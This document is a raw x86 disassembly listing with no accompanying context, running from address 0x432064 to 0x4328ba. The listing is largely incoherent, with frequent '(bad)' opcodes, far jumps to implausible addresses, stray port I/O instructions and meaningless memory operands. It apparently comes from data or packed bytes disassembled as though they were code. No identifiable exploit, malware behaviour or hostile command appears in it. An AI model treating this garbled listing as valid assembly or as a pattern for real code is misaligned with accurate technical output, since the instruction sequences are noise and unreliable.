  432064:	mov    bh,0xc0
  432066:	push   ss
  432067:	ins    BYTE PTR es:[edi],dx
  432068:	push   ecx
  432069:	add    BYTE PTR [ecx-0x5],dl
  43206c:	add    eax,0x17200
  432071:	sbb    al,0x85
  432073:	dec    esp
  432074:	je     0x4320ae
  432076:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43207a:	add    BYTE PTR [ebx],bh
  43207c:	(bad)  
  43207d:	and    al,0x39
  43207f:	jae    0x43201d
  432081:	mov    cl,cl
  432083:	inc    DWORD PTR [esp]
  432086:	push   ebp
  432087:	shr    esp,0x8
  43208a:	in     al,dx
  43208b:	push   esp
  43208c:	add    DWORD PTR [eax],esp
  43208e:	add    bl,cl
  432090:	inc    ebp
  432091:	mov    bh,0x89
  432093:	add    ah,bh
  432095:	jmp    0xca7c2fdf
  43209a:	pushf  
  43209b:	dec    esp
  43209c:	mov    edx,0xf8178520
  4320a1:	fst    DWORD PTR [ebp+0x0]
  4320a4:	mov    BYTE PTR [eax],0xc4
  4320a7:	sub    edx,DWORD PTR [ebx-0x3f]
  4320aa:	inc    ebp
  4320ab:	add    eax,0xc601da
  4320b0:	mov    al,0xc6
  4320b3:	ins    BYTE PTR es:[edi],dx
  4320b4:	mov    DWORD PTR [eax+0x57],0x280545c1
  4320bb:	dec    esp
  4320bc:	jmp    DWORD PTR [eax]
  4320be:	inc    ebp
  4320bf:	fnstcw WORD PTR [esi+0x29]
  4320c2:	test   BYTE PTR [eax],0xc6
  4320c5:	rol    BYTE PTR [eax],0xc0
  4320c8:	lea    ecx,[ebp-0x3cf0dbcb]
  4320ce:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4320d4:	inc    esi
  4320d5:	add    DWORD PTR [eax],ebx
  4320d7:	add    dh,bh
  4320d9:	mov    esi,DWORD PTR [edx+0x8]
  4320dc:	(bad)  
  4320dd:	fdiv   QWORD PTR ss:[ecx]
  4320e0:	(bad)  
  4320e1:	mov    bl,ch
  4320e3:	add    esi,eax
  4320e5:	add    dh,bl
  4320e7:	or     esi,eax
  4320e9:	mov    dl,0xdf
  4320eb:	add    esi,eax
  4320ed:	add    al,ah
  4320ef:	push   cs
  4320f0:	mov    BYTE PTR [edx+0xc601e1],0xe2
  4320f7:	or     BYTE PTR [ebx],dh
  4320f9:	dec    ecx
  4320fa:	lea    eax,[ebx]
  4320fc:	xor    eax,0x18fc0fc7
  432101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432102:	repz clc 
  432104:	add    eax,DWORD PTR [ebp+0x46]
  432107:	prefetcht0 BYTE PTR [ecx-0x2]
  43210b:	xor    eax,0x7c60872
  432110:	mov    esp,0xbd32c699
  432115:	pop    esi
  432116:	mov    cl,0xbe
  432119:	or     al,0xc6
  43211b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  432122:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  432129:	add    dh,al
  43212b:	mov    eax,ebx
  43212d:	xor    DWORD PTR [ebx],0x35008dbc
  432133:	mov    ecx,DWORD PTR [edi]
  432135:	sbb    al,0x18
  432137:	inc    ebp
  432138:	xrelease mov DWORD PTR [ebx],0x188546f4
  43213f:	clc    
  432140:	(bad)  
  432141:	ss jb  0x4320e0
  432144:	lea    ecx,[ecx+0x45ffe838]
  43214a:	mov    ebp,esp
  43214c:	fadd   st,st(6)
  43214e:	dec    ebp
  43214f:	lds    edi,FWORD PTR [eax+0x7145fc56]
  432155:	out    0x1,eax
  432157:	inc    ebp
  432158:	lea    ebp,[ecx]
  43215a:	inc    esi
  43215c:	dec    eax
  43215e:	enter  0xa33,0xc6
  432162:	push   ebp
  432163:	leave  
  432164:	(bad)  
  432165:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43216b:	add    BYTE PTR [ebp+0x44],al
  43216e:	mov    eax,esp
  432170:	mov    WORD PTR [esi+0x44398300],?
  432176:	psubusw mm4,QWORD PTR [eax-0x78]
  43217a:	add    BYTE PTR [ebx-0x1303f975],al
  432180:	add    BYTE PTR [ebp+0x1],0xeb
  432184:	add    BYTE PTR [ebp+0x38],al
  432187:	jmp    0xdbce66d1
  43218c:	add    BYTE PTR [ebp+0x0],0xe8
  432190:	mov    DWORD PTR [ebp-0x48],eax
  432193:	sub    DWORD PTR [edi+0x45],ecx
  432196:	add    BYTE PTR [eax],ch
  432198:	js     0x4321df
  43219a:	data16 jle 0x432122
  43219d:	idiv   bh
  43219f:	inc    esp
  4321a0:	(bad)  
  4321a1:	fadd   st(7),st
  4321a3:	mov    dh,0x89
  4321a5:	and    DWORD PTR [esi+0x44],0xffffffff
  4321a9:	fld    DWORD PTR [ebx-0x767cbc78]
  4321af:	pop    es
  4321b0:	push   0x8d45ffec
  4321b5:	jmp    0xe6cc66bd
  4321ba:	push   0x45
  4321bc:	jmp    edx
  4321be:	add    DWORD PTR [ebp+0xd],0xfffffff5
  4321c2:	mov    DWORD PTR [ebp+0x6c],eax
  4321c5:	(bad)  
  4321c7:	inc    ebp
  4321c8:	(bad)  
  4321c9:	out    dx,al
  4321ca:	add    al,0x45
  4321cc:	mov    edi,esp
  4321ce:	outs   dx,BYTE PTR ds:[esi]
  4321cf:	inc    ebp
  4321d0:	(bad)  
  4321d1:	jle    0x432156
  4321d3:	idiv   BYTE PTR ds:0x70bc8944
  4321d9:	mov    dh,0xff
  4321db:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  4321e2:	jb     0x432167
  4321e4:	dec    DWORD PTR [eax]
  4321e6:	mov    ebp,esp
  4321e8:	test   WORD PTR [ebp-0x1],ax
  4321ef:	inc    ebp
  4321f0:	ror    BYTE PTR [ebx-0x137a279a],0xff
  4321f7:	adc    edi,edi
  4321f9:	mov    ebp,edi
  4321fb:	mov    eax,DWORD PTR [eax]
  4321fd:	cmp    BYTE PTR [esi-0x1],ah
  432200:	test   DWORD PTR [ebx],edi
  432202:	push   DWORD PTR [ebp-0x1]
  432205:	mov    DWORD PTR [esi-0x48],ebp
  432208:	add    BYTE PTR [ebp+0x66],al
  43220b:	jmp    0x432192
  43220d:	pushf  
  43220e:	dec    DWORD PTR [ebx-0x7f940301]
  432214:	add    BYTE PTR [ecx],al
  432216:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43221d:	add    al,al
  43221f:	add    BYTE PTR [esi+0x45],ah
  432222:	test   DWORD PTR [ebx+0xff7cff],ecx
  432228:	inc    eax
  432229:	mov    DWORD PTR [eax],eax
  43222b:	mov    esp,DWORD PTR [esi-0x4]
  43222e:	inc    ebp
  43222f:	cmp    BYTE PTR [eax+0x4701],0x38
  432236:	mov    DWORD PTR [ebp-0x7e],ebp
  432239:	add    BYTE PTR [edi-0x73],al
  43223c:	push   0xffffffcd
  43223e:	mov    WORD PTR [ebp+0x64],ax
  432242:	(bad)  
  432243:	call   eax
  432245:	mov    esp,esi
  432247:	data16 cmc 
  432249:	test   DWORD PTR [ebp-0x1],eax
  43224c:	(bad)  
  43224e:	out    0xc0,eax
  432250:	lea    esp,[esi-0x30]
  432253:	test   DWORD PTR [edx+0x44ff80ff],ecx
  432259:	inc    edi
  43225a:	jmp    0x75ff:0x40858866
  432261:	dec    DWORD PTR [ebp-0x7a992f40]
  432267:	test   esi,edi
  432269:	(bad)  
  43226a:	(bad)  
  43226b:	inc    DWORD PTR [ebp-0x9901b9]
  432271:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  432277:	rcl    BYTE PTR [ecx+0x66],0x33
  43227b:	test   DWORD PTR [ebx+0xff72ff],edi
  432281:	inc    edi
  432282:	ret    
  432283:	mov    ax,WORD PTR [ebp-0x3f0004]
  43228a:	push   eax
  43228b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432292:	add    BYTE PTR [ebx-0x764f0839],al
  432298:	push   DWORD PTR [esi+0x1]
  43229b:	inc    DWORD PTR [eax]
  43229d:	mov    eax,0xff99ff
  4322a2:	or     BYTE PTR [ecx-0x7a87bb],cl
  4322a8:	jne    0x432262
  4322aa:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  4322b4:	mov    ecx,0xd74fb8
  4322b9:	add    cl,al
  4322bb:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4322c1:	or     DWORD PTR [ebx+0x558966e4],0x7e
  4322c8:	(bad)  
  4322c9:	(bad)  
  4322ca:	std    
  4322cb:	mov    eax,0x8c2789
  4322d0:	ret    0x6689
  4322d3:	adc    BYTE PTR [ebp+0x40],0x8d
  4322d7:	add    bh,ah
  4322d9:	mov    WORD PTR [ebp-0x70],ax
  4322dd:	(bad)  
  4322de:	ret    0x6605
  4322e1:	or     BYTE PTR [ebp-0x77],dl
  4322e4:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  4322eb:	loop   0x432276
  4322ed:	(bad)  
  4322ee:	xchg   esi,eax
  4322ef:	aam    0xcf
  4322f1:	out    dx,al
  4322f2:	mov    DWORD PTR [esi-0x68],edi
  4322f5:	inc    ebp
  4322f6:	dec    edx
  4322f7:	pop    ecx
  4322f8:	mov    edx,DWORD PTR [eax]
  4322fa:	repnz push bp
  4322fd:	or     BYTE PTR [ebx+0x5510663a],0x49
  432304:	(bad)  
  432305:	repnz cmp eax,0xa0898945
  43230b:	mov    ah,0x89
  43230d:	jmp    DWORD PTR [edx+0x66b0418d]
  432313:	inc    DWORD PTR [ebp+0x50]
  432316:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43231a:	mov    DWORD PTR [eax],ecx
  43231c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43231d:	pop    es
  43231e:	inc    ecx
  43231f:	(bad)  
  432320:	cwd    
  432322:	inc    ebp
  432323:	xor    ah,BYTE PTR [esi+0x3]
  432326:	dec    ebp
  432327:	push   eax
  432328:	inc    bp
  43232a:	jge    0x4322af
  43232c:	mov    esp,DWORD PTR [esi-0x18]
  43232f:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  432335:	add    DWORD PTR [ebx],esi
  432337:	add    BYTE PTR [ebx],al
  432339:	test   DWORD PTR [ebx],esi
  43233b:	(bad)  
  43233c:	inc    WORD PTR [ebp+0x0]
  432340:	mov    eax,DWORD PTR [eax]
  432342:	call   0x8898da77
  432347:	mov    esi,eax
  432349:	clc    
  43234a:	ret    
  43234b:	rol    cl,0xa
  43234e:	mov    DWORD PTR ds:0x7c0ec88,esi
  432354:	mov    edx,edi
  432356:	pushf  
  432357:	pop    es
  432358:	jmp    DWORD PTR [edx+0x66]
  43235b:	add    BYTE PTR [ebp-0x990175],al
  432361:	inc    ebp
  432362:	test   DWORD PTR [ebx-0x2f00ea02],eax
  432368:	push   ebp
  432369:	mov    edi,eax
  43236b:	mov    dh,BYTE PTR [eax+0x266ff51]
  432371:	push   ebp
  432372:	add    BYTE PTR [ebx-0x764b0777],al
  432378:	dec    DWORD PTR [esi+0x661851e8]
  43237e:	add    BYTE PTR [ebp-0x7b],dl
  432381:	cmp    esi,0x3
  432384:	dec    DWORD PTR [ecx+0x51fe9285]
  43238a:	jmp    DWORD PTR [esi-0x75]
  43238d:	push   ebp
  43238e:	hlt    
  43238f:	data16 (bad) 
  432391:	dec    ebp
  432392:	ret    
  432393:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432399:	lea    edx,[eax-0x1]
  43239c:	jne    0x43236f
  43239e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4323a4:	dec    BYTE PTR [ecx+0x51559eff]
  4323aa:	mov    DWORD PTR [esi-0x4c],esp
  4323ad:	push   ebp
  4323ae:	jmp    DWORD PTR [esi-0x18]
  4323b1:	inc    ebp
  4323b2:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4323b8:	(bad)  
  4323b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4323ba:	inc    eax
  4323bc:	test   DWORD PTR [esi-0x2],esp
  4323bf:	inc    ebp
  4323c0:	dec    DWORD PTR [ebp-0x760bde75]
  4323c6:	(bad)  
  4323c7:	test   al,0xc3
  4323c9:	mov    DWORD PTR [ebp-0x769b56],ecx
  4323cf:	lods   al,BYTE PTR ds:[esi]
  4323d0:	push   eax
  4323d1:	inc    ebp
  4323d2:	jne    0x4323e3
  4323d4:	dec    DWORD PTR [ebp+0x8]
  4323d7:	mov    eax,DWORD PTR [edi]
  4323d9:	sbb    al,0x0
  4323db:	(bad)  
  4323dc:	mov    eax,0xc14fc3
  4323e1:	mov    DWORD PTR [eax-0x64],edi
  4323e4:	inc    bp
  4323e6:	test   DWORD PTR [edi],ecx
  4323e8:	dec    DWORD PTR [ebp-0x1]
  4323eb:	xor    eax,edi
  4323ed:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4323f3:	inc    ebp
  4323f4:	xor    DWORD PTR [ebx],0x43
  4323f7:	mov    WORD PTR [ebp-0x1bc],ax
  4323fe:	lea    ecx,[ecx-0x7677fe]
  432404:	inc    esi
  432405:	(bad)  
  432406:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43240d:	pushf  
  43240e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432415:	add    bh,bh
  432417:	add    BYTE PTR [edi],cl
  432419:	test   DWORD PTR [eax],eax
  43241b:	(bad)  
  43241c:	dec    WORD PTR [ebp-0xff002d]
  432423:	mov    DWORD PTR [eax-0x48],esi
  432426:	add    bh,bh
  432428:	lea    cx,[ebp-0x50]
  43242f:	push   eax
  432430:	rol    BYTE PTR [ebp+0x0],1
  432433:	xor    esp,DWORD PTR [esi+0x3]
  432436:	lea    edx,[eax-0x1]
  432439:	test   edi,edi
  43243b:	dec    DWORD PTR [ebp-0x1]
  43243e:	mov    edi,edi
  432440:	dec    eax
  432441:	clc    
  432442:	call   DWORD PTR [ebp-0x73]
  432445:	lea    esi,[eax+0x51ffff88]
  43244b:	lea    ecx,[ebp-0x78]
  43244e:	test   WORD PTR [ebp-0x2],ax
  432455:	popf   
  432456:	push   ecx
  432457:	add    BYTE PTR [ecx-0x77],dl
  43245a:	xor    edi,DWORD PTR [eax-0x724a007d]
  432460:	cdq    
  432461:	mov    al,0x32
  432463:	inc    DWORD PTR [ebx]
  432465:	push   eax
  432466:	push   ecx
  432467:	inc    ebp
  432468:	shl    BYTE PTR [ebx],1
  43246a:	lea    eax,[ebx]
  43246c:	call   DWORD PTR [eax-0x1]
  43246f:	test   DWORD PTR [ebx],esi
  432471:	inc    DWORD PTR [eax-0x1]
  432474:	(bad)  
  432475:	(bad)  
  432476:	(bad)  
  432477:	clc    
  432478:	call   DWORD PTR [ebp+0x50]
  43247b:	jmp    0xcc25f5
  432480:	inc    esp
  432481:	jae    0x432482
  432483:	add    BYTE PTR [ecx-0x384f73],cl
  432489:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43248f:	mov    eax,DWORD PTR [ecx]
  432491:	data16 add BYTE PTR [ebp-0xb50077],al
  432498:	inc    eax
  43249a:	lea    esp,[esi+0x1c]
  43249d:	test   DWORD PTR [ecx-0xb301],ecx
  4324a3:	inc    edi
  4324a4:	(bad)  
  4324a5:	dec    si
  4324a7:	test   edi,edi
  4324a9:	push   DWORD PTR [ecx]
  4324ab:	(bad)  
  4324ac:	jnp    0x4324fd
  4324ae:	(bad)  
  4324af:	mov    edx,DWORD PTR [edx-0x7d]
  4324b2:	(bad)  
  4324b3:	mov    ebx,0x563a8935
  4324b8:	(bad)  
  4324b9:	call   FWORD PTR [esi-0x47]
  4324bc:	inc    DWORD PTR ds:0x893000e2
  4324c2:	(bad)  
  4324c3:	pop    eax
  4324c4:	mov    ah,0xff
  4324c6:	(bad)  
  4324c7:	mov    ecx,0x5745
  4324cc:	dec    DWORD PTR [ecx-0xf7a501]
  4324d2:	(bad)  
  4324d3:	mov    ecx,0x456108
  4324d8:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4324de:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4324e4:	inc    BYTE PTR gs:[eax]
  4324e7:	inc    DWORD PTR [ebp-0x73]
  4324ea:	ss (bad) 
  4324ec:	pushf  
  4324ed:	inc    edi
  4324ef:	mov    ebx,eax
  4324f1:	hlt    
  4324f2:	test   DWORD PTR [ecx-0xbab708],ecx
  4324f8:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  4324fe:	lock into 
  432500:	test   eax,eax
  432502:	clc    
  432503:	mov    ebx,0x367245
  432508:	lahf   
  432509:	retf   
  43250a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432510:	add    edi,edi
  432512:	add    BYTE PTR [ecx+0x45],dl
  432515:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43251c:	mov    edx,DWORD PTR [ecx-0x74]
  43251f:	inc    DWORD PTR [eax]
  432521:	cld    
  432522:	mov    eax,DWORD PTR [ebp-0x6f0175]
  432528:	add    BYTE PTR [ebp-0x1b0177],al
  43252e:	jge    0x432575
  432530:	test   DWORD PTR [ebx+0xff9875],ecx
  432536:	sbb    BYTE PTR [esi+0x55],ah
  432539:	xchg   ebp,eax
  43253a:	call   0x43203e
  43253f:	push   edi
  432540:	inc    ebp
  432541:	mov    dx,WORD PTR [ebp-0xfc0075]
  432548:	cmp    al,0x85
  43254a:	ud0    eax,DWORD PTR [ebp-0x1]
  43254e:	test   DWORD PTR [edi+0x74],ecx
  432551:	dec    edi
  432552:	inc    DWORD PTR [ebp-0xf70004]
  432558:	dec    DWORD PTR [edi-0x75]
  43255b:	dec    edi
  43255c:	cld    
  43255d:	test   DWORD PTR [eax+0xff01ff],eax
  432563:	icebp  
  432564:	add    BYTE PTR [edi-0x3a],cl
  432567:	test   ebx,eax
  432569:	inc    BYTE PTR [ebp-0x1]
  43256c:	jne    0x43256e
  43256e:	mov    eax,DWORD PTR [eax]
  432570:	cld    
  432571:	xor    BYTE PTR [ecx+0x500155],cl
  432577:	push   ebp
  432578:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43257e:	add    BYTE PTR [ebp+0x35e90f50],al
  432584:	add    al,BYTE PTR [eax]
  432586:	add    BYTE PTR [ebx-0x38fe4f80],al
  43258c:	add    ah,ch
  43258e:	or     BYTE PTR [ebp+0x4501f845],dh
  432594:	jmp    0xdf288f
  432599:	(bad)  
  43259a:	nop    ecx
  43259d:	test   DWORD PTR [ebp+0x4502f8],eax
  4325a3:	cmp    BYTE PTR [ebp-0x64],cl
  4325a6:	mov    eax,edi
  4325a8:	mov    ebx,DWORD PTR [eax+edx*2]
  4325ab:	add    eax,0x45fef885
  4325b0:	dec    DWORD PTR [ebx+0x339445]
  4325b6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4325bc:	dec    DWORD PTR [ebx-0x460f0375]
  4325c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4325c3:	add    esi,edi
  4325c5:	add    bh,bh
  4325c7:	rdpmc  
  4325c9:	add    BYTE PTR [ebx],0x1
  4325cc:	mov    DWORD PTR [eax],eax
  4325ce:	add    al,0x45
  4325d0:	dec    DWORD PTR [ecx-0x360b3373]
  4325d6:	dec    DWORD PTR [esi]
  4325d8:	push   eax
  4325d9:	jne    0x432620
  4325db:	mov    esi,DWORD PTR [ebx]
  4325dd:	cld    
  4325de:	add    ebp,ebx
  4325e0:	push   eax
  4325e1:	inc    DWORD PTR [ebp-0x75]
  4325e4:	add    eax,0x800e4
  4325e9:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4325ef:	mov    DWORD PTR [ecx],eax
  4325f1:	sbb    al,0x0
  4325f3:	leave  
  4325f4:	test   DWORD PTR [edi-0x2],eax
  4325f7:	jne    0x4325f8
  4325f9:	call   0xff4410fe
  4325fe:	xor    BYTE PTR [ebp+0x4d],al
  432601:	mov    edi,edi
  432603:	enter  0x8,0x4d
  432607:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43260d:	mov    eax,DWORD PTR [eax]
  43260f:	cld    
  432610:	add    DWORD PTR [ecx],ebx
  432612:	inc    ebp
  432613:	dec    ebp
  432614:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43261a:	inc    eax
  43261b:	dec    DWORD PTR [ecx-0x270375]
  432621:	add    BYTE PTR [ebx-0x39d72701],cl
  432627:	xchg   ecx,eax
  432628:	ret    
  432629:	add    BYTE PTR [ebp-0x830075],al
  43262f:	add    BYTE PTR [ebp-0x75],al
  432632:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  432638:	lea    edi,[edi-0xc]
  43263b:	add    bh,bh
  43263d:	mov    edx,DWORD PTR [eax-0x7b]
  432640:	inc    ebp
  432641:	rdpmc  
  432643:	jne    0x432648
  432645:	add    BYTE PTR [eax-0x75],dl
  432648:	inc    ebp
  432649:	clc    
  43264a:	add    eax,0x400009
  43264f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  432655:	mov    eax,DWORD PTR [ecx]
  432657:	in     al,dx
  432658:	add    dh,al
  43265a:	test   ebx,eax
  43265c:	inc    BYTE PTR [ebp-0xff0001]
  432662:	add    BYTE PTR [ebp-0x43],al
  432665:	cmp    esi,0xfffffff8
  432668:	(bad)  
  432669:	push   DWORD PTR [eax]
  43266b:	add    BYTE PTR [ebp-0x3a],dl
  43266e:	test   ebx,eax
  432670:	je     0x4325f7
  432672:	mov    edi,edi
  432674:	sbb    al,0xff
  432676:	test   DWORD PTR gs:[eax],eax
  432679:	(bad)  
  43267a:	js     0x43267b
  43267c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432682:	sub    eax,ebx
  432684:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43268a:	add    eax,DWORD PTR [eax]
  43268c:	dec    ebp
  43268d:	push   eax
  43268e:	mov    al,BYTE PTR [ebp+0x1]
  432691:	mov    eax,DWORD PTR [ebp-0x68]
  432694:	mov    eax,DWORD PTR [eax]
  432696:	sbb    bh,al
  432698:	or     ah,dh
  43269a:	dec    ebp
  43269b:	inc    DWORD PTR [eax+0x4]
  43269e:	push   ecx
  43269f:	add    BYTE PTR [edx-0x1],dh
  4326a2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4326a8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4326b2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4326b8:	push   ecx
  4326b9:	cmp    BYTE PTR [ebx],al
  4326bb:	inc    ebp
  4326bc:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4326c2:	(bad)  
  4326c3:	(bad)  
  4326c4:	in     al,0xff
  4326c6:	add    BYTE PTR [ebp+0x0],al
  4326c9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4326cf:	add    al,bh
  4326d1:	(bad)  
  4326d2:	jmp    0x8d85:0x74b0558d
  4326d9:	dec    DWORD PTR [eax]
  4326db:	call   DWORD PTR [ebp-0x7b]
  4326de:	mov    edi,esi
  4326e0:	lock call DWORD PTR [ebp-0x75]
  4326e4:	mov    esi,esp
  4326e6:	mov    ah,0xc6
  4326e8:	mov    bh,0xc3
  4326ea:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4326f0:	add    DWORD PTR [eax],0x450050ff
  4326f6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4326fc:	inc    edi
  4326fe:	push   esp
  432700:	jmp    0xcd00:0x670481ff
  432707:	mov    DWORD PTR [ebx],esi
  432709:	clc    
  43270a:	cmp    edi,0xff9cff3b
  432710:	jne    0x43271a
  432712:	mov    eax,eax
  432714:	add    esi,DWORD PTR [eax]
  432716:	int3   
  432717:	inc    ebp
  432718:	cmp    al,0x83
  43271a:	add    BYTE PTR [eax],bl
  43271c:	adc    DWORD PTR [ebx+0x768b5055],eax
  432722:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  432728:	mov    edi,eax
  43272a:	cmp    BYTE PTR [ebp+0x45],cl
  43272d:	jmp    0x4326ba
  43272f:	mov    ebx,DWORD PTR [esp+ebp*8]
  432732:	inc    ebp
  432733:	or     al,0x2
  432735:	dec    DWORD PTR [ebp+0x18]
  432738:	jne    0x43278f
  43273a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  432740:	mov    edi,DWORD PTR [ebx]
  432742:	in     al,0x50
  432744:	xchg   ecx,eax
  432745:	jmp    0x343764a
  43274a:	adc    al,0x8b
  43274c:	inc    ebp
  43274d:	mov    al,ds:0x8b04008b
  432752:	push   ebp
  432753:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  432759:	push   ebp
  43275a:	test   DWORD PTR [ebx-0x2800d701],ecx
  432760:	inc    ebp
  432761:	dec    ebp
  432762:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  432768:	mov    DWORD PTR [eax],0xe9ff00f4
  43276e:	add    al,0x0
  432770:	add    BYTE PTR [eax],al
  432772:	mov    eax,edx
  432774:	push   eax
  432775:	rol    DWORD PTR [ebp-0xf0177],1
  43277b:	bound  eax,QWORD PTR [ebp+0x50]
  43277e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432784:	add    BYTE PTR [ecx+0x558df0ff],cl
  43278a:	mov    al,0xf
  43278c:	test   DWORD PTR [edx],edx
  43278e:	call   DWORD PTR [ebp-0x7a0001]
  432794:	(bad)  
  432795:	loop   0x432796
  432797:	jnp    0xc6991b9d
  43279d:	mov    eax,ebx
  43279f:	cmp    al,0x8b
  4327a1:	(bad)  
  4327a2:	cld    
  4327a3:	shr    esi,0xc
  4327a6:	add    dl,al
  4327a8:	push   eax
  4327a9:	lea    eax,[ebp-0x1]
  4327ac:	mov    edx,esi
  4327ae:	cwde   
  4327af:	cli    
  4327b0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4327b6:	or     BYTE PTR [eax],cl
  4327b8:	inc    ebp
  4327b9:	dec    ebp
  4327ba:	inc    DWORD PTR [ebx+0x74803914]
  4327c0:	add    DWORD PTR [ebx+0x451800],ecx
  4327c6:	call   DWORD PTR [eax+edx*1]
  4327c9:	add    ecx,DWORD PTR [ebp-0x34]
  4327cc:	push   edi
  4327cd:	adc    al,0x8
  4327cf:	mov    edx,DWORD PTR [ebp-0x14]
  4327d2:	mov    ecx,DWORD PTR [ebp+0x18]
  4327d5:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4327d9:	inc    DWORD PTR [eax+esi*8]
  4327dc:	inc    ebp
  4327dd:	stos   BYTE PTR es:[edi],al
  4327de:	mov    edx,DWORD PTR [ebp-0x4]
  4327e1:	add    DWORD PTR [ebp-0x1c],eax
  4327e4:	mov    edx,DWORD PTR [ebp-0x70]
  4327e7:	cmp    eax,DWORD PTR [eax]
  4327e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4327ea:	mov    eax,DWORD PTR [eax]
  4327ec:	cld    
  4327ed:	jae    0x43276f
  4327ef:	add    eax,DWORD PTR [ecx]
  4327f1:	clc    
  4327f2:	add    BYTE PTR [eax+0x30],dl
  4327f5:	mov    DWORD PTR [ecx],esi
  4327f7:	clc    
  4327f8:	pop    ds
  4327f9:	inc    ebp
  4327fa:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432800:	(bad)  
  432801:	push   DWORD PTR [edi]
  432803:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432809:	(bad)  
  43280a:	jae    0x43280b
  43280c:	mov    eax,DWORD PTR [ebp-0x740175]
  432812:	sub    eax,DWORD PTR [eax]
  432814:	add    eax,DWORD PTR [eax]
  432816:	mov    DWORD PTR [ecx+0x5f],eax
  432819:	mov    DWORD PTR [ebx-0x4],ebx
  43281c:	ret    0xff
  43281f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  432825:	ret    
  432826:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43282c:	add    BYTE PTR [ebp-0x7d],al
  43282f:	mov    DWORD PTR [eax],eax
  432831:	add    al,0x84
  432833:	inc    DWORD PTR [ecx]
  432835:	lea    eax,[eax]
  432837:	hlt    
  432838:	sar    bh,cl
  43283a:	test   BYTE PTR [eax+0x1],dl
  43283d:	inc    ebp
  43283e:	add    BYTE PTR [ebx],dh
  432840:	test   BYTE PTR [ebx],0x84
  432843:	push   eax
  432844:	add    BYTE PTR [ebp+0x0],al
  432847:	add    eax,0x86
  43284c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  432852:	add    BYTE PTR [ecx],al
  432854:	add    BYTE PTR [eax],al
  432856:	mov    esi,0x550030
  43285b:	mov    ecx,DWORD PTR [edi]
  43285d:	cld    
  43285e:	fidiv  DWORD PTR [ebp+0x0]
  432861:	mov    edi,DWORD PTR [ecx]
  432863:	xor    BYTE PTR [eax+eax*1],0x84
  432867:	add    eax,DWORD PTR [eax]
  432869:	sbb    BYTE PTR [eax],al
  43286b:	jne    0x43281e
  43286d:	mov    eax,DWORD PTR [ecx]
  43286f:	sbb    BYTE PTR [eax],al
  432871:	mov    DWORD PTR [ebp-0x1],esp
  432874:	add    BYTE PTR [eax+0x30e45ca],bh
  43287a:	ret    0xb7fc
  43287d:	dec    ebp
  43287e:	or     al,0x89
  432880:	dec    ebp
  432881:	cld    
  432882:	cmovne ecx,DWORD PTR [eax-0x75]
  432886:	add    edi,esp
  432888:	seto   BYTE PTR [esi-0x72ffffff]
  43288f:	inc    ebp
  432890:	adc    al,0x8b
  432892:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432899:	cmp    DWORD PTR [edi+0x72],edx
  43289c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4328a2:	gs cmp al,0x0
  4328a5:	je     0x43287d
  4328a7:	push   eax
  4328a8:	sar    BYTE PTR [eax],1
  4328aa:	mov    bh,0x3e
  4328ac:	push   cs
  4328ad:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4328b3:	add    DWORD PTR [ecx+0x12],ebp
  4328b6:	dec    edx
  4328b7:	(bad)  
  4328b8:	mov    eax,edx
  4328ba:	in     al,dx
